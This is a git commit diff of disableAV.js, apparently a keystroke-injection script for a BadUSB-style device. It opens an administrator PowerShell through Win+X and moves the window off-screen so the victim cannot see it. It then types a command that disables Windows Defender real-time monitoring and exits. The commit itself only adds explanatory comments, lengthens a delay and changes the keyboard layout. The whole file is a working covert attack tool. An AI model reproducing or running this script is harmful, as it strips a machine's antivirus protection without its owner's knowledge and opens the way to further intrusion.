58e98a9dda908e6dc8492608de8c88e345640697
Nexr0n <39227048+Nexr0n@users.noreply.github.com>
2020-05-25 11:21:58 -0700

    Update disableAV.js

--- disableAV.js
+++ disableAV.js
@@ -1,30 +1,35 @@
-function fast() {
-  typingSpeed(0,0)
+function fast() { //sets typing speed as fast as possible with no randomness 
+  	typingSpeed(0,0)
 }
-function startPS() {
+
+function startPS() { //starts powershell (if fails on slower computers extend the delays and see if that helps)
 	press("GUI x");
 	delay(50);
 	press("a");
-	delay(300);
+	delay(500);
 	press("LEFT");
 	delay(50);
 	press("ENTER");
 	delay(200);
 }
-function hidePS() {
+
+function hidePS() { //moves powershell window far outside of screeen coords but keeps window in focus to allow typing off screen
 	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
   	press("ENTER");
 }
-function disableAV() {
-	type("Set-MpPreference -DisableRealtimeMonitoring $true")
+
+function disableAV() { //disables windows defender real time monitoring
+	type('Set-MpPreference -DisableRealtimeMonitoring $true')
 	press("ENTER");
 	delay(200);
 }
-function exitPS() {
+
+function exitPS() { //exits Powershell
 	type("exit")
 	press("ENTER");
 }
-layout('de');
+
+layout('us');
 fast();
 startPS();
 //hidePS();
